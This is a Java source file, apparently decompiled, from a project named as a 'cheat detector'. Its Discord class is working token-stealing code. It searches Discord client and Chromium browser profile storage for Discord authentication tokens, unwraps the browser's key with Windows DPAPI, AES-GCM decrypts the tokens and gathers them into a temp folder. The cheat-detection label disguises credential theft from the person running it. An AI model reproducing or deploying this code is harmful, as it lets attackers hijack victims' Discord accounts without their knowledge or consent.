package bro.impl;

import bro.CheatDetector;
import bro.impl.browsers.Chromium;
import bro.utilities.OSUtility;
import bro.utilities.chromium.ChromiumProfile;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.http.HttpEntity;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Discord {
   public static final File DIR;
   public static final ArrayList<File> DISCORD_PATH_CACHE;
   public static final ArrayList<String> BROWSERS_PATH_CACHE;

   public static String getFormattedTokens() {
      StringBuilder var0 = new StringBuilder();

      String var2;
      try {
         for(Iterator var1 = getTokens().iterator(); var1.hasNext(); var0.append(var2).append(System.lineSeparator())) {
            var2 = (String)var1.next();
            if (!DIR.exists()) {
               DIR.mkdirs();
            }
         }
      } catch (Exception var3) {
      }

      return var0.toString();
   }

   public static String entityToString(HttpEntity var0) {
      try {
         BufferedReader var1 = new BufferedReader(new InputStreamReader(var0.getContent()));
         StringBuilder var2 = new StringBuilder();

         String var3;
         while((var3 = var1.readLine()) != null) {
            var2.append(var3);
         }

         return var2.toString();
      } catch (Exception var4) {
         var4.printStackTrace();
         return "{}";
      }
   }

   public static ArrayList getTokens() {
      ArrayList var0 = new ArrayList();
      Iterator var1 = DISCORD_PATH_CACHE.iterator();
      while(true) {
         File var3;
         String var4;
         do {
            File var2;
            do {
               do {
                  if (!var1.hasNext()) {
                     var1 = BROWSERS_PATH_CACHE.iterator();

                     label453:
                     while(true) {
                        String var45;
                        do {
                           if (!var1.hasNext()) {
                              return var0;
                           }

                           var45 = (String)var1.next();
                           var3 = new File(var45);
                        } while(!var3.exists());

                        Iterator<ChromiumProfile> var46 = Chromium.getUserDatas(var45).iterator();

                        while(true) {
                           File var48;
                           String var49;
                           do {
                              do {
                                 if (!var46.hasNext()) {
                                    continue label453;
                                 }

                                 ChromiumProfile var47 = var46.next();
                                 var48 = new File(var47.getFullPath(), "Local Storage\\leveldb");
                              } while(!var48.exists());

                              var49 = Chromium.getDecryptionKey(var3.getAbsolutePath());
                           } while(var48.listFiles() == null);

                           File[] var50 = Objects.requireNonNull(var48.listFiles());

                            for (File var53 : var50) {
                                String var54 = var53.getName();
                                if (var54.endsWith(".log") || var54.endsWith(".ldb") || var54.endsWith(".sqlite")) {
                                    try {

                                        try (BufferedReader var55 = new BufferedReader(new FileReader(var53))) {
                                            Throwable var14 = null;
                                            String var15;
                                            while ((var15 = var55.readLine()) != null) {
                                                var0.addAll(parseToken(var15, "[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}", var49));
                                            }
                                        }
                                    } catch (Exception var41) {
                                        var41.printStackTrace();
                                    }
                                }
                            }
                        }
                     }
                  }

                  var2 = (File)var1.next();
               } while(!var2.exists());
            } while(!(var3 = new File(var2, "Local Storage\\leveldb")).exists());

            var4 = Chromium.getDecryptionKey(var2.getAbsolutePath());
         } while(var3.listFiles() == null);

         File[] var5 = Objects.requireNonNull(var3.listFiles());

          for (File var8 : var5) {
              String var9 = var8.getName();
              String var10 = var8.getAbsolutePath().toLowerCase();
              if (var9.endsWith(".log") || var9.endsWith(".ldb") || var9.endsWith(".sqlite")) {
                  try {

                      try (BufferedReader var11 = new BufferedReader(new FileReader(var8))) {
                          Throwable var12 = null;
                          String var13;
                          while ((var13 = var11.readLine()) != null) {
                              var0.addAll(parseToken(var13, "[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}", var4));
                              if (var10.contains("roaming") && var10.contains("discord")) {
                                  var0.addAll(parseToken(var13, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*", var4));
                              }
                          }
                      }
                  } catch (Exception ignored) {
                  }
              }
          }
      }
   }

   public static ArrayList<String> parseToken(String var0, String var1, String var2) {
      ArrayList var3 = new ArrayList();
      Pattern var4 = Pattern.compile(var1);
      Matcher var5 = var4.matcher(var0);

      while(var5.find()) {
         String var6 = var5.group();
         if (var6.startsWith("dQw4w9WgXcQ")) {
            try {
               var3.add(decryptToken(var6, var2));
            } catch (Exception var8) {
               var8.printStackTrace();
            }
         }
      }

      return var3;
   }

   public static String decryptToken(String var0, String var1) throws Exception {
       byte[] token = Base64.getDecoder().decode(var0);
       byte[] key = var1.getBytes();
       byte[] finalKey = Crypt32Util.cryptUnprotectData(key);
       byte[] finaltoken = new byte[12];
       System.arraycopy(token, 3, finaltoken, 0, 12);
       byte[] data = new byte[token.length - 15];
       System.arraycopy(token, 15, data, 0, data.length);
       Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
       cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finaltoken));
       return new String(cipher.doFinal(data));
   }

   static {
      DIR = new File(CheatDetector.TEMP_DIRECTORY, "\\Discord\\");
      DISCORD_PATH_CACHE = new ArrayList<>();
      BROWSERS_PATH_CACHE = new ArrayList<>();
      DISCORD_PATH_CACHE.add(new File(OSUtility.ROAMING_APPDATA + "Discord\\"));
      DISCORD_PATH_CACHE.add(new File(OSUtility.ROAMING_APPDATA + "discordptb\\"));
      DISCORD_PATH_CACHE.add(new File(OSUtility.ROAMING_APPDATA + "discordcanary\\"));
      BROWSERS_PATH_CACHE.addAll(Arrays.asList(Chromium.BASED_BROWSERS));
   }
}
